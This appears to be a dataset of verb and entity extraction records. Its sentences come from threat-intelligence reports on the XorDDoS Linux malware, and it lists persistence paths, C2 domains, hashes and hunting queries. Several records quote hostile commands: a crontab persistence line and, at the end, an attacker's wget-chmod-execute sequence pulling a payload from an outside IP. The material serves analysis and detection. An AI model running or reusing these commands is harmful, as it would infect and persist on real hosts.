+en_verb: pass, m.word: /etc/cron.hourly/gcc.sh.the, sent: 
+cron script
+
+the malware creates a cron script at the location /etc/cron.hourly/gcc.sh.the cron script passes parameters with the following content:
+
+screenshot of the contents of the gcc.sh script.
+---
+en_verb: delete, m.word: /etc/crontab, sent: 
+it then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:
+
+screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
+---
+en_verb: delete, m.word: /etc/cron.hourly/gcc.sh, sent: 
+it then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:
+
+screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
+---
+en_verb: delete, m.word: /etc/cron.hourly/gcc.sh, sent: 
+it then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:
+
+screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
+---
+en_verb: delete, m.word: /etc/crontab, sent: 
+it then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:
+
+screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
+---
+en_verb: delete, m.word: /etc/crontab, sent: it reads system(sed -i \'/\\/etc\\/cron.hourly\\/gcc.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc.sh\' >> /etc/crontab);
+figure 13. system command to delete the /etc/cron.hourly/gcc.sh entry from the /etc/crontab file and add a new entry
+
+---
+en_verb: None, m.word: /etc/cron.hourly/gcc.sh\', sent: it reads system(sed -i \'/\\/etc\\/cron.hourly\\/gcc.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc.sh\' >> /etc/crontab);
+figure 13. system command to delete the /etc/cron.hourly/gcc.sh entry from the /etc/crontab file and add a new entry
+
+---
+en_verb: None, m.word: /etc/crontab);, sent: it reads system(sed -i \'/\\/etc\\/cron.hourly\\/gcc.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc.sh\' >> /etc/crontab);
+figure 13. system command to delete the /etc/cron.hourly/gcc.sh entry from the /etc/crontab file and add a new entry
+
+---
+en_verb: delete, m.word: /etc/cron.hourly/gcc.sh, sent: it reads system(sed -i \'/\\/etc\\/cron.hourly\\/gcc.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc.sh\' >> /etc/crontab);
+figure 13. system command to delete the /etc/cron.hourly/gcc.sh entry from the /etc/crontab file and add a new entry
+
+---
+en_verb: delete, m.word: /etc/crontab, sent: it reads system(sed -i \'/\\/etc\\/cron.hourly\\/gcc.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc.sh\' >> /etc/crontab);
+figure 13. system command to delete the /etc/cron.hourly/gcc.sh entry from the /etc/crontab file and add a new entry
+
+---
+en_verb: None, m.word: /etc/cron.hourly/gcc.sh, sent: 
+screenshot of a command that reads :*/3 * * * * root /etc/cron.hourly/gcc.sh
+figure 14. the content of the file /etc/crontab
+
+---
+en_verb: None, m.word: /etc/crontab, sent: 
+screenshot of a command that reads :*/3 * * * * root /etc/cron.hourly/gcc.sh
+figure 14. the content of the file /etc/crontab
+
+---
+en_verb: None, m.word: /etc/rc<run_level>, sent: the /etc/rc<run_level> directory contains symbolic links (symlinks), which are soft links that point to the original file.
+---
+en_verb: None, m.word: /etc/init.d/<base_file_name>, sent: the malware creates a symlink for the init script dropped at the location /etc/init.d/<base_file_name> with the directories associated with runlevels 1 through 5 at /etc/rc<run_level>.d/s90<base_file_name> and /etc/rc.d/rc<run_level>.d/s90<base_file_name>.
+---
+en_verb: None, m.word: /etc/rc<run_level>.d/s90<base_file_name>, sent: the malware creates a symlink for the init script dropped at the location /etc/init.d/<base_file_name> with the directories associated with runlevels 1 through 5 at /etc/rc<run_level>.d/s90<base_file_name> and /etc/rc.d/rc<run_level>.d/s90<base_file_name>.
+---
+en_verb: None, m.word: /etc/rc.d/rc<run_level>.d/s90<base_file_name>., sent: the malware creates a symlink for the init script dropped at the location /etc/init.d/<base_file_name> with the directories associated with runlevels 1 through 5 at /etc/rc<run_level>.d/s90<base_file_name> and /etc/rc.d/rc<run_level>.d/s90<base_file_name>.
+---
+en_verb: None, m.word: /etc/init.d/<base_file_name>., sent: screenshot displaying the installation of rc.d directory's symlink scripts with /etc/init.d/<base_file_name>.
+---
+en_verb: None, m.word: /etc/init.d/<base_file_name>, sent: figure 15. installation of rc.d directory’s symlink scripts with /etc/init.d/<base_file_name>
+auto-start services
+
+the malware runs a command to install startup services that automatically run xorddos at boot.
+---
+en_verb: add, m.word: chkconfig, sent: the commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
+---
+en_verb: None, m.word: update-rc.d, sent: the commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
+---
+en_verb: install, m.word: chkconfig, sent: screenshot displaying chkconfig and update-rc.d commands installing the startup service
+figure 16. chkconfig and update-rc.d commands install the startup service
+argument-based code-flow
+xorddos has specific code paths corresponding to the number of arguments provided to the program.
+---
+en_verb: None, m.word: update-rc.d, sent: screenshot displaying chkconfig and update-rc.d commands installing the startup service
+figure 16. chkconfig and update-rc.d commands install the startup service
+argument-based code-flow
+xorddos has specific code paths corresponding to the number of arguments provided to the program.
+---
+en_verb: install, m.word: chkconfig, sent: screenshot displaying chkconfig and update-rc.d commands installing the startup service
+figure 16. chkconfig and update-rc.d commands install the startup service
+argument-based code-flow
+xorddos has specific code paths corresponding to the number of arguments provided to the program.
+---
+en_verb: None, m.word: update-rc.d, sent: screenshot displaying chkconfig and update-rc.d commands installing the startup service
+figure 16. chkconfig and update-rc.d commands install the startup service
+argument-based code-flow
+xorddos has specific code paths corresponding to the number of arguments provided to the program.
+---
+en_verb: call, m.word: /proc/self/exe, sent: before handling the argument-based control, it calls the readlink api with the first parameter as /proc/self/exe to fetch its full process path.
+---
+en_verb: create, m.word: /var/run/., sent: if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.
+---
+en_verb: create, m.word: /var/run/., sent: if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.
+---
+en_verb: create, m.word: /var/run/., sent: if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.
+---
+en_verb: None, m.word: “0xda718716”, sent: 
+2: clean-up code path
+
+in this code path, the malware runs with another argument provided as the pid, for example:
+
+/usr/bin/jwvwvxoupv 4849
+using the above example, the malware shares the 64-byte size memory segment with the ipc key “0xda718716” to check for another malware process provided as an argument.
+---
+en_verb: None, m.word: /etc/init.d/<file_name>, sent: additionally, it performs the following tasks on a provided $pid:
+
+fetches the process file name corresponding to the provided $pid
+deletes the file for the provided $pid
+deletes the installed init services:
+deletes /etc/init.d/<file_name>
+for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>
+performs the command chkconfig –del <file_name>
+performs the command update-rc.d <file_name> remove
+ends the process that was provided as an argument.
+---
+en_verb: None, m.word: /etc/rc<runlevel>.d/s90<file_name>, sent: additionally, it performs the following tasks on a provided $pid:
+
+fetches the process file name corresponding to the provided $pid
+deletes the file for the provided $pid
+deletes the installed init services:
+deletes /etc/init.d/<file_name>
+for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>
+performs the command chkconfig –del <file_name>
+performs the command update-rc.d <file_name> remove
+ends the process that was provided as an argument.
+---
+en_verb: perform, m.word: chkconfig, sent: additionally, it performs the following tasks on a provided $pid:
+
+fetches the process file name corresponding to the provided $pid
+deletes the file for the provided $pid
+deletes the installed init services:
+deletes /etc/init.d/<file_name>
+for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>
+performs the command chkconfig –del <file_name>
+performs the command update-rc.d <file_name> remove
+ends the process that was provided as an argument.
+---
+en_verb: None, m.word: update-rc.d, sent: additionally, it performs the following tasks on a provided $pid:
+
+fetches the process file name corresponding to the provided $pid
+deletes the file for the provided $pid
+deletes the installed init services:
+deletes /etc/init.d/<file_name>
+for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>
+performs the command chkconfig –del <file_name>
+performs the command update-rc.d <file_name> remove
+ends the process that was provided as an argument.
+---
+en_verb: find, m.word: sh, sent: 
+the fake commands can include:
+
+cat resolv.conf
+netstat -an
+bash
+whoami
+id
+cd /etc
+ifconfig eth0
+ifconfig
+echo “find”
+uptime
+sh
+top
+gnome-terminal
+su
+netstat -antop
+grep “a”
+who
+ls -la
+pwd
+route -n
+ps -ef
+ls
+sleep 1
+
+---
+en_verb: None, m.word: /proc/$pid/exe., sent: it then enters a five-second loop to perform the following checks:
+
+fetches the file name specific to the $pid provided as part of the third argument by calling the readlink api on /proc/$pid/exe.
+---
+en_verb: None, m.word: 0xbb2fa36aaa9541f0., sent: 
+as mentioned in the xor-based encryption section, the encoded string m7a4nq_/na translates to the folder path /usr/bin when decoded with the multi-byte key 0xbb2fa36aaa9541f0.
+---
+en_verb: use, m.word: /proc/rs_dev, sent: 
+xorddos uses /proc/rs_dev character device to communicate with the rootkit.
+---
+en_verb: use, m.word: /proc/rs_dev, sent: 
+xorddos uses /proc/rs_dev character device to communicate with the rootkit.
+---
+en_verb: use, m.word: /proc/rs_dev, sent: screenshot of the code where the xorddos binary uses the /proc/rs_dev device handle to access the rootkit.
+---
+en_verb: use, m.word: /proc/rs_dev, sent: screenshot of the code where the xorddos binary uses the /proc/rs_dev device handle to access the rootkit.
+---
+en_verb: None, m.word: /proc/rs_dev., sent: figure 20. the rootkit becomes accessible to the xorddos malware by using the device handle /proc/rs_dev.
+---
+en_verb: None, m.word: /proc/rs_dev., sent: figure 20. the rootkit becomes accessible to the xorddos malware by using the device handle /proc/rs_dev.
+---
+en_verb: None, m.word: /proc/rs_dev., sent: 
+xorddos attempts to open /proc/rs_dev.
+---
+en_verb: None, m.word: /proc/rs_dev., sent: 
+xorddos attempts to open /proc/rs_dev.
+---
+en_verb: None, m.word: “0xad1473b8”, sent: if the rootkit is active, it uses the owner value “0xad1473b8” and group value “0xad1473b8” to change the ownership of dropped files with the function lchown(<filename>, 0xad1473b8, 0xad1473b8).
+---
+en_verb: None, m.word: “0xad1473b8”, sent: if the rootkit is active, it uses the owner value “0xad1473b8” and group value “0xad1473b8” to change the ownership of dropped files with the function lchown(<filename>, 0xad1473b8, 0xad1473b8).
+---
+en_verb: None, m.word: 0xad1473b8,, sent: if the rootkit is active, it uses the owner value “0xad1473b8” and group value “0xad1473b8” to change the ownership of dropped files with the function lchown(<filename>, 0xad1473b8, 0xad1473b8).
+---
+en_verb: None, m.word: 0xad1473b8)., sent: if the rootkit is active, it uses the owner value “0xad1473b8” and group value “0xad1473b8” to change the ownership of dropped files with the function lchown(<filename>, 0xad1473b8, 0xad1473b8).
+---
+en_verb: fetch, m.word: www.enoan2107.com:3306, sent: after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server:
+www.enoan2107.com:3306
+www.gzcfr5axf6.com:3306
+malicious activity threads
+after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.
+---
+en_verb: fetch, m.word: www.gzcfr5axf6.com:3306, sent: after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server:
+www.enoan2107.com:3306
+www.gzcfr5axf6.com:3306
+malicious activity threads
+after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.
+---
+en_verb: fetch, m.word: /var/run/gcc.pid, sent: 
+ kill_process
+
+the kill_process thread performs the following tasks:
+
+decodes encrypted strings
+fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file
+fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so
+fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process
+reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:
+md5=
+filename=
+rmfile=
+denyip=
+tcp_thread
+
+the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().
+---
+en_verb: fetch, m.word: /var/run/gcc.pid, sent: 
+ kill_process
+
+the kill_process thread performs the following tasks:
+
+decodes encrypted strings
+fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file
+fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so
+fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process
+reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:
+md5=
+filename=
+rmfile=
+denyip=
+tcp_thread
+
+the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().
+---
+en_verb: fetch, m.word: /var/run/gcc.pid, sent: 
+ kill_process
+
+the kill_process thread performs the following tasks:
+
+decodes encrypted strings
+fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file
+fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so
+fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process
+reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:
+md5=
+filename=
+rmfile=
+denyip=
+tcp_thread
+
+the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().
+---
+en_verb: read, m.word: /var/run/gcc.pid, sent: it performs the following tasks:
+
+reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.
+---
+en_verb: read, m.word: /var/run/gcc.pid, sent: it performs the following tasks:
+
+reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.
+---
+en_verb: read, m.word: /var/run/gcc.pid, sent: it performs the following tasks:
+
+reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.
+---
+en_verb: execute, m.word: suid/sgid, sent: 
+events with the following titles indicate threat activity related to xorddos:
+
+the content of libudev.so was collected into libudev.so.6
+bash process performed system information discovery by invoking ifconfig
+gcc.sh was executed after being dropped by hflggwyfsc.elf
+a shell command was executed by crond
+suid/sgid process unix_chkpwd executed
+screenshot of the microsoft 365 defender timeline showing the alert where a suspicious shell command run by crond was dropped from the malicious .elf.
+---
+en_verb: None, m.word: (/etc/cron.hourly/gcc.sh,, sent: figure 26. microsoft 365 defender timeline with an event on a suspicious shell command run by crond after it was dropped from hflggwyfsc.elf
+hunting queries
+to locate malicious activity related to xorddos activity, run the following advanced hunting queries in microsoft 365 defender or microsoft defender security center:
+
+failed sign-ins
+
+devicelogonevents
+| where initiatingprocessfilename == sshd
+    and actiontype == logonfailed
+| summarize count() by dayofyear = datetime_part(dayofyear, timestamp)
+| sort by dayofyear 
+| render linechart
+creation of the xorddos-specific dropped files
+
+devicefileevents
+| extend fullpath=strcat(folderpath, filename)
+| where fullpath in (/etc/cron.hourly/gcc.sh, /lib/libudev.so.6, /lib/libudev.so, /var/run/gcc.pid)
+command-line of malicious process
+
+deviceprocessevents
+| where processcommandline contains cat resolv.conf
+
+---
+en_verb: None, m.word: /var/run/gcc.pid), sent: figure 26. microsoft 365 defender timeline with an event on a suspicious shell command run by crond after it was dropped from hflggwyfsc.elf
+hunting queries
+to locate malicious activity related to xorddos activity, run the following advanced hunting queries in microsoft 365 defender or microsoft defender security center:
+
+failed sign-ins
+
+devicelogonevents
+| where initiatingprocessfilename == sshd
+    and actiontype == logonfailed
+| summarize count() by dayofyear = datetime_part(dayofyear, timestamp)
+| sort by dayofyear 
+| render linechart
+creation of the xorddos-specific dropped files
+
+devicefileevents
+| extend fullpath=strcat(folderpath, filename)
+| where fullpath in (/etc/cron.hourly/gcc.sh, /lib/libudev.so.6, /lib/libudev.so, /var/run/gcc.pid)
+command-line of malicious process
+
+deviceprocessevents
+| where processcommandline contains cat resolv.conf
+
+---
+en_verb: None, m.word: /var/run/gcc.pid), sent: figure 26. microsoft 365 defender timeline with an event on a suspicious shell command run by crond after it was dropped from hflggwyfsc.elf
+hunting queries
+to locate malicious activity related to xorddos activity, run the following advanced hunting queries in microsoft 365 defender or microsoft defender security center:
+
+failed sign-ins
+
+devicelogonevents
+| where initiatingprocessfilename == sshd
+    and actiontype == logonfailed
+| summarize count() by dayofyear = datetime_part(dayofyear, timestamp)
+| sort by dayofyear 
+| render linechart
+creation of the xorddos-specific dropped files
+
+devicefileevents
+| extend fullpath=strcat(folderpath, filename)
+| where fullpath in (/etc/cron.hourly/gcc.sh, /lib/libudev.so.6, /lib/libudev.so, /var/run/gcc.pid)
+command-line of malicious process
+
+deviceprocessevents
+| where processcommandline contains cat resolv.conf
+
+---
+en_verb: None, m.word: /var/run/gcc.pid), sent: figure 26. microsoft 365 defender timeline with an event on a suspicious shell command run by crond after it was dropped from hflggwyfsc.elf
+hunting queries
+to locate malicious activity related to xorddos activity, run the following advanced hunting queries in microsoft 365 defender or microsoft defender security center:
+
+failed sign-ins
+
+devicelogonevents
+| where initiatingprocessfilename == sshd
+    and actiontype == logonfailed
+| summarize count() by dayofyear = datetime_part(dayofyear, timestamp)
+| sort by dayofyear 
+| render linechart
+creation of the xorddos-specific dropped files
+
+devicefileevents
+| extend fullpath=strcat(folderpath, filename)
+| where fullpath in (/etc/cron.hourly/gcc.sh, /lib/libudev.so.6, /lib/libudev.so, /var/run/gcc.pid)
+command-line of malicious process
+
+deviceprocessevents
+| where processcommandline contains cat resolv.conf
+
+---
+en_verb: drop, m.word: /etc/init.d/hflggwyfsc.elf, sent: 
+dropped files
+dropped file path	file type	sha-256
+/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
+/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
+/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
+/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
+/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
+/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
+/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
+/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
+/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
+/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
+/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
+/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+
+---
+en_verb: drop, m.word: /etc/cron.hourly/gcc.sh, sent: 
+dropped files
+dropped file path	file type	sha-256
+/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
+/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
+/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
+/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
+/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
+/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
+/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
+/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
+/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
+/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
+/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
+/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+
+---
+en_verb: drop, m.word: /run/gcc.pid, sent: 
+dropped files
+dropped file path	file type	sha-256
+/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
+/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
+/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
+/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
+/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
+/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
+/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
+/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
+/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
+/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
+/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
+/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
+/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
+/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
+/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
+/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
+
+---
+en_verb: download, m.word: www.enoan2107.com:3306, sent: 
+download urls
+www.enoan2107.com:3306
+www.gzcfr5axf6.com:3306
+hxxp://aa.hostasa.org/config.rar
+
+---
+en_verb: download, m.word: www.gzcfr5axf6.com:3306, sent: 
+download urls
+www.enoan2107.com:3306
+www.gzcfr5axf6.com:3306
+hxxp://aa.hostasa.org/config.rar
+
+---
+en_verb: drop, m.word: /etc/cron.hourly/gcc.sh, sent: 
+this backdoor drops the following files:
+
+/etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems)
+backdoor routine
+
+---
+en_verb: None, m.word: {blocked}t456.com/dd.rar:1520, sent: {blocked}t456.com/dd.rar:1520
+
+---
+en_verb: None, m.word: /etc/rc{1-5}.d/s90{random, sent: creates symbolic links which points to the script in /etc/init.d:
+/etc/rc{1-5}.d/s90{random numbers}
+/etc/rc.d/rc{1-5}.d/s90{random numbers}
+get the magic string value from the file /var/run/gcc.pid
+read the following from its configuration file:
+md5 - checksum of file
+denyip - open communication with an ip
+filename - list of filename
+rmfile - files to remove
+---
+en_verb: None, m.word: /etc/rc.d/rc{1-5}.d/s90{random, sent: creates symbolic links which points to the script in /etc/init.d:
+/etc/rc{1-5}.d/s90{random numbers}
+/etc/rc.d/rc{1-5}.d/s90{random numbers}
+get the magic string value from the file /var/run/gcc.pid
+read the following from its configuration file:
+md5 - checksum of file
+denyip - open communication with an ip
+filename - list of filename
+rmfile - files to remove
+---
+en_verb: read, m.word: /var/run/gcc.pid, sent: creates symbolic links which points to the script in /etc/init.d:
+/etc/rc{1-5}.d/s90{random numbers}
+/etc/rc.d/rc{1-5}.d/s90{random numbers}
+get the magic string value from the file /var/run/gcc.pid
+read the following from its configuration file:
+md5 - checksum of file
+denyip - open communication with an ip
+filename - list of filename
+rmfile - files to remove
+---
+en_verb: read, m.word: /var/run/gcc.pid, sent: creates symbolic links which points to the script in /etc/init.d:
+/etc/rc{1-5}.d/s90{random numbers}
+/etc/rc.d/rc{1-5}.d/s90{random numbers}
+get the magic string value from the file /var/run/gcc.pid
+read the following from its configuration file:
+md5 - checksum of file
+denyip - open communication with an ip
+filename - list of filename
+rmfile - files to remove
+---
+en_verb: read, m.word: /var/run/gcc.pid, sent: creates symbolic links which points to the script in /etc/init.d:
+/etc/rc{1-5}.d/s90{random numbers}
+/etc/rc.d/rc{1-5}.d/s90{random numbers}
+get the magic string value from the file /var/run/gcc.pid
+read the following from its configuration file:
+md5 - checksum of file
+denyip - open communication with an ip
+filename - list of filename
+rmfile - files to remove
+---
+en_verb: wget, m.word: http://122.51.133.49:10086/vip, sent: afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:
+
+wget http://122.51.133.49:10086/vip –o vip
+chmod 777 vip
+./vip
